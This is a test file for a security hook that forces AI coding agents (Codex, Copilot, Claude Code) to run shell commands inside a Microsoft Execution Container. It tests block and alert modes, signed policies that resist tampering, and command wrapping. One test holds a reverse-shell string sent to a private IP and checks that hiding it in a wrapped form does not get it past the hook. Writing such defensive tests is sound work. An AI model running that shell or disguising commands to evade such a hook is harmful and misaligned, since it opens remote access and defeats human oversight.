// MXC enforcement (cli/containment-enforce.mjs) through the REAL hook subprocess. The hook is told it runs
// on Windows 11 26100 by a test-only preload (test/fixtures/fake-win32.mjs); the hook itself has no platform
// knob. reg.exe does not exist here, so a registry read gives an unknown UBR (mxcCapable null).
//
//   node --test --import ./test/hermetic-env.mjs test/containment-enforce-hook.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { generateKeyPairSync, sign as edSign } from "node:crypto";
import { policyCanonical, policyDigest, POLICY_SIG_VERSION, publicKeyId } from "../cli/hook-core.mjs";
import { rmTree } from "./fs-cleanup.mjs";
import { SENTINEL, FAULT_MARK } from "./fixtures/hook-fault.mjs";
import { sleep, until, consoleStub, sandbox, run, BASH, out, hso, lastRow, containAlerts, fakeWindowsTree, configsIn, wrappedForm, wrapCfgName } from "./containment-hook-harness.mjs";

test("Codex, block, no MXC in its config → denied CONTAINMENT_MISSING with one content-free alert", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "block" });
  const r = await run(home, BASH("ls -la secret-project"));
  assert.equal(r.code, 0, r.stderr);
  const h = hso(r.stdout);
  assert.equal(h.permissionDecision, "deny");
  assert.match(h.permissionDecisionReason, /requires Codex to run commands inside a Microsoft Execution Container/);
  assert.equal(lastRow(home).reasonCode, "CONTAINMENT_MISSING");
  assert.ok(await until(() => containAlerts(c).length === 1), JSON.stringify(c.alerts.map((a) => a.category)));
  const a = containAlerts(c)[0];
  assert.equal(a.category, "Containment: agent commands not in MXC");
  assert.equal(a.decision, "deny");
  assert.equal(a.host, "codex");
  assert.equal(a.containmentKind, "none");
  assert.equal(a.containmentSource, "codex:unset");
  assert.equal(a.containmentRequired, "block");
  assert.equal(a.mxcCapable, null);
  assert.ok(!/secret-project|ls -la/.test(JSON.stringify(a)), "content-free");
});

test("Codex, block, windows.sandbox = \"mxc\" → allowed, no containment alert", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "block" });
  mkdirSync(join(home, ".codex"), { recursive: true });
  writeFileSync(join(home, ".codex", "config.toml"), '[windows]\nsandbox = "mxc"\n');
  const r = await run(home, BASH("ls"));
  assert.equal(hso(r.stdout).permissionDecision, undefined, r.stdout);
  assert.notEqual(lastRow(home).reasonCode, "CONTAINMENT_MISSING");
  await sleep(500);
  assert.equal(containAlerts(c).length, 0);
});

test("Codex, alert mode → allowed; the alert is posted once per session", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "alert" });
  for (let i = 0; i < 2; i++) {
    const r = await run(home, BASH("ls"));
    assert.equal(hso(r.stdout).permissionDecision, undefined, r.stdout);
  }
  assert.ok(await until(() => containAlerts(c).length >= 1));
  await sleep(700);
  assert.equal(containAlerts(c).length, 1, "second call of the same session posts nothing new");
  assert.equal(containAlerts(c)[0].decision, "allow");
  assert.equal(containAlerts(c)[0].reasonCode, "CONTAINMENT_MISSING");
});

test("Copilot, block, sandbox.enabled unset and capability unknown → alert only (unknown kind is denied only on a capable device)", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "block" });
  const r = await run(home, BASH("ls"), { host: "copilot" });
  assert.equal(hso(r.stdout).permissionDecision, undefined, r.stdout);
  assert.ok(await until(() => containAlerts(c).length === 1));
  assert.equal(containAlerts(c)[0].containmentSource, "copilot:unset");
  assert.equal(containAlerts(c)[0].decision, "allow");
});

test("cache tamper: ~/.moorai/mxc-capable.json edited to 'incapable' does not turn a block-mode deny into an UNAVAILABLE alert", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "block" });
  // UBR 1 is below 26100.9278: the cache claims this device cannot run MXC.
  writeFileSync(join(home, ".moorai", "mxc-capable.json"), JSON.stringify({ release: "10.0.26100", ubr: 1, at: Date.now() }));
  const r = await run(home, BASH("ls"));
  assert.equal(hso(r.stdout).permissionDecision, "deny", r.stdout);
  assert.equal(lastRow(home).reasonCode, "CONTAINMENT_MISSING");
  // Under alert the cache may only change the reason an alert carries.
  const home2 = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "alert" });
  writeFileSync(join(home2, ".moorai", "mxc-capable.json"), JSON.stringify({ release: "10.0.26100", ubr: 1, at: Date.now() }));
  const r2 = await run(home2, BASH("ls"));
  assert.equal(hso(r2.stdout).permissionDecision, undefined);
});

test("off Windows the fields are ignored: block policy, Codex with no MXC → allowed, no containment alert", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "block", containmentClaudeCode: "wrap" });
  const r = await run(home, BASH("ls"), { win: false });
  assert.equal(hso(r.stdout).permissionDecision, undefined, r.stdout);
  const r2 = await run(home, BASH("ls"), { win: false, host: "claude-code" });
  assert.equal(hso(r2.stdout).updatedInput, undefined, r2.stdout);
  await sleep(500);
  assert.equal(containAlerts(c).length, 0);
});

// ---- signed vs unsigned ----
const TENANT = "ct-signed";
const key = generateKeyPairSync("ed25519");
function signPolicy(policy) {
  const iat = new Date(Date.now() - 1000).toISOString();
  const sig = edSign(null, Buffer.from(policyCanonical({ v: POLICY_SIG_VERSION, tenant: TENANT, iat, digest: policyDigest(policy) })), key.privateKey).toString("base64");
  return JSON.stringify({ ...policy, policySig: { v: POLICY_SIG_VERSION, alg: "ed25519", tenant: TENANT, iat, sig } });
}

test("signed vs unsigned: on a pinned device an unsigned user-written policy cannot turn block off", async (t) => {
  const signed = { pubkey: JSON.stringify({ tenant: TENANT, alg: "ed25519", publicKey: publicKeyId(key.publicKey) }), policy: () => signPolicy({ captureTier: "content-free", containmentRequired: "block" }) };
  const c = await consoleStub(t, { signed });
  const home = mkdtempSync(join(tmpdir(), "moorai-contain-signed-"));
  t.after(() => rmTree(home));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: c.url, tenant: TENANT, installToken: "tok-signed" }));
  const r1 = await run(home, BASH("ls"));
  assert.equal(hso(r1.stdout).permissionDecision, "deny", `the signed live policy blocks: ${r1.stdout} ${r1.stderr.slice(0, 300)}`);
  // The user overwrites the cache with an unsigned policy that says "off", and the console goes away.
  writeFileSync(join(home, ".moorai", "hook-policy.json"), JSON.stringify({ captureTier: "content-free", containmentRequired: "off" }));
  c.down = true;
  const r2 = await run(home, BASH("ls"));
  assert.equal(hso(r2.stdout).permissionDecision, "deny", `unsigned "off" must not apply: ${r2.stdout}`);
  assert.equal(lastRow(home).reasonCode, "CONTAINMENT_MISSING");
  assert.match(lastRow(home).policyId, /^pol:ct-signed:/, "the signed policy decided");
});

// ---- fail mode ----
test("an error inside the containment check follows the hook's fail mode: closed → exit 2 FAIL_CLOSED; open → proceeds", async (t) => {
  const c = await consoleStub(t);
  for (const [fm, expectDeny] of [["closed", true], ["open", false]]) {
    const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "alert", failMode: { hook: fm } });
    mkdirSync(join(home, ".codex"), { recursive: true });
    // tomlKeys calls startsWith on each config line; the fault fixture throws on this one, inside hostKind.
    writeFileSync(join(home, ".codex", "config.toml"), `# ${SENTINEL}\n`);
    const r = await run(home, BASH("ls"), { fault: true });
    assert.ok(r.stderr.includes(FAULT_MARK), `fault did not fire: ${r.stderr.slice(0, 300)}`);
    if (expectDeny) {
      assert.equal(r.code, 2, r.stderr);
      assert.equal(hso(r.stdout).permissionDecision, "deny");
      assert.equal(lastRow(home).reasonCode, "FAIL_CLOSED");
    } else {
      assert.equal(r.code, 0, r.stderr);
      assert.equal(hso(r.stdout).permissionDecision, undefined);
    }
  }
});

// ---- Claude Code wrap ----
test("Claude Code wrap impossible (no wxc-exec under Program Files): block → deny UNAVAILABLE; off → allow, one alert per session", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentClaudeCode: "wrap", containmentRequired: "block" });
  const r = await run(home, BASH("ls"), { host: "claude-code" });
  assert.equal(hso(r.stdout).permissionDecision, "deny", r.stdout);
  assert.match(hso(r.stdout).permissionDecisionReason, /cannot put this command in one on this device/);
  assert.equal(lastRow(home).reasonCode, "CONTAINMENT_UNAVAILABLE");

  const home2 = sandbox(t, c.url, { captureTier: "content-free", containmentClaudeCode: "wrap" });
  for (let i = 0; i < 2; i++) {
    const r2 = await run(home2, BASH("ls"), { host: "claude-code" });
    assert.equal(hso(r2.stdout).permissionDecision, undefined, r2.stdout);
    assert.equal(hso(r2.stdout).updatedInput, undefined);
  }
  assert.ok(await until(() => containAlerts(c).some((a) => a.decision === "allow")));
  await sleep(700);
  const allows = containAlerts(c).filter((a) => a.decision === "allow");
  assert.equal(allows.length, 1, "once per session");
  assert.equal(allows[0].reasonCode, "CONTAINMENT_UNAVAILABLE");
  assert.equal(allows[0].wrapWhy, "no-wxc-exec");
  assert.equal(allows[0].host, "claude-code");
});

// The success path, end to end on macOS: see fakeWindowsTree in test/containment-hook-harness.mjs.
test("Claude Code wrap: the Bash call becomes a wxc-exec launch, other fields kept, no permissionDecision; the config carries the command", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentClaudeCode: "wrap", containmentRequired: "block" });
  const env = { ...fakeWindowsTree(home), USERPROFILE: "C:\\Users\\dev" };
  const cmd = `echo "a b" && printf '%s\\n' 'it''s' | cat # 100% ^done`;
  const r = await run(home, BASH(cmd, { description: "Echo things", timeout: 120000, run_in_background: false }), { host: "claude-code", env });
  assert.equal(r.code, 0, r.stderr);
  const o = out(r.stdout);
  const h = o.hookSpecificOutput || {};
  assert.equal(h.permissionDecision, undefined, "a wrap never auto-approves");
  assert.equal(o.systemMessage, undefined, "no user-facing message for a wrap alone");
  assert.match(h.additionalContext, /Microsoft Execution Container/);
  assert.equal(h.updatedInput.description, "Echo things");
  assert.equal(h.updatedInput.timeout, 120000);
  assert.equal(h.updatedInput.run_in_background, false);
  assert.ok(h.updatedInput.command.startsWith(`__moorai_show='${cmd.replace(/'/g, "'\\''")}'; `), "the prompt shows the original");
  const m = /'; MSYS_NO_PATHCONV=1 'C:\/Program Files\/Microsoft MXC\/wxc-exec\.exe' --config '(C:\\Users\\dev\\AppData\\Local\\MoorAI Host\\wrap\\wrap-[0-9a-f]{32}\.json)'$/.exec(h.updatedInput.command);
  assert.ok(m, h.updatedInput.command);
  const cfg = JSON.parse(readFileSync(join(home, m[1]), "utf8"));
  assert.ok(cfg.process.env.includes(`MOORAI_WRAP_CMD=${cmd}`), "the command rides in the config env, byte for byte");
  assert.deepEqual(cfg.filesystem.readwritePaths, ["C:\\src\\proj"]);
  assert.equal(cfg.process.cwd, "C:\\src\\proj");
  assert.ok(!cfg.process.commandLine.includes("echo"));
  assert.equal(lastRow(home).wrap, 1);
  assert.equal(lastRow(home).decision, "allow");

  // Idempotence: the wrapped command sent back is unwrapped, scanned as the original and wrapped ONCE again.
  const r2 = await run(home, BASH(h.updatedInput.command), { host: "claude-code", env });
  const h2 = hso(r2.stdout);
  assert.ok(h2.updatedInput.command.startsWith(`__moorai_show='${cmd.replace(/'/g, "'\\''")}'; MSYS_NO_PATHCONV=1 'C:/Program Files/Microsoft MXC/wxc-exec.exe' --config '`), h2.updatedInput.command);
  assert.equal((h2.updatedInput.command.match(/MSYS_NO_PATHCONV=1/g) || []).length, 1, "one level, never two");
  assert.notEqual(h2.updatedInput.command, h.updatedInput.command);
  const m2 = /--config '([^']+)'$/.exec(h2.updatedInput.command);
  const cfg2 = JSON.parse(readFileSync(join(home, m2[1]), "utf8"));
  assert.ok(cfg2.process.env.includes(`MOORAI_WRAP_CMD=${cmd}`), "the original, not the wxc-exec launch, is what runs inside");
  assert.equal(configsIn(home).length, 2);
});

test("Claude Code wrap: a dangerous command sent in wrapped form is judged as the original", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentClaudeCode: "wrap", threatPolicy: { 54: "block" } });
  const env = { ...fakeWindowsTree(home), USERPROFILE: "C:\\Users\\dev" };
  const evil = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
  const r = await run(home, BASH(evil), { host: "claude-code", env });
  assert.equal(hso(r.stdout).permissionDecision, "deny", "denied in plain form");
  // Hand-build the wrapped form around a config of ours that carries the reverse shell.
  const cfgName = wrapCfgName("b");
  writeFileSync(join(home, cfgName), JSON.stringify({ process: { env: [`MOORAI_WRAP_CMD=${evil}`] } }));
  // The display claims a harmless command; the config's command is what is judged.
  const r2 = await run(home, BASH(wrappedForm("ls", cfgName)), { host: "claude-code", env });
  assert.equal(hso(r2.stdout).permissionDecision, "deny", `wrapped form must not hide the command: ${r2.stdout}`);
});

// ---- posture ----
test("posture heartbeat carries containmentRequired and claudeCodeWrap (Windows: the effective modes; elsewhere: off)", async (t) => {
  for (const [win, expect] of [[true, { containmentRequired: "block", claudeCodeWrap: "unavailable" }], [false, { containmentRequired: "off", claudeCodeWrap: "off" }]]) {
    const c = await consoleStub(t);
    const home = sandbox(t, c.url, { captureTier: "content-free", containmentRequired: "block", containmentClaudeCode: "wrap" });
    mkdirSync(join(home, ".codex"), { recursive: true });
    writeFileSync(join(home, ".codex", "config.toml"), '[windows]\nsandbox = "mxc"\n');
    await run(home, BASH("ls"), { win });
    assert.ok(await until(() => c.posture.length >= 1, 10000), "heartbeat posted");
    assert.equal(c.posture[0].containmentRequired, expect.containmentRequired);
    assert.equal(c.posture[0].claudeCodeWrap, expect.claudeCodeWrap);
  }
});

test("Claude Code PowerShell tool with wrap + block: denied CONTAINMENT_UNAVAILABLE (the wrap covers Bash only)", async (t) => {
  const c = await consoleStub(t);
  const home = sandbox(t, c.url, { captureTier: "content-free", containmentClaudeCode: "wrap", containmentRequired: "block" });
  const env = { ...fakeWindowsTree(home), USERPROFILE: "C:\\Users\\dev" };
  const r = await run(home, { tool_name: "PowerShell", tool_input: { command: "Get-ChildItem" } }, { host: "claude-code", env });
  assert.equal(hso(r.stdout).permissionDecision, "deny", r.stdout);
  assert.equal(lastRow(home).reasonCode, "CONTAINMENT_UNAVAILABLE");
  assert.ok(await until(() => containAlerts(c).some((a) => a.wrapWhy === "powershell-tool" && a.decision === "deny")));
  // The same tree wraps a Bash call: the refusal is the PowerShell tool, not the device.
  const rb = await run(home, BASH("ls"), { host: "claude-code", env });
  assert.ok(hso(rb.stdout).updatedInput, rb.stdout);
});
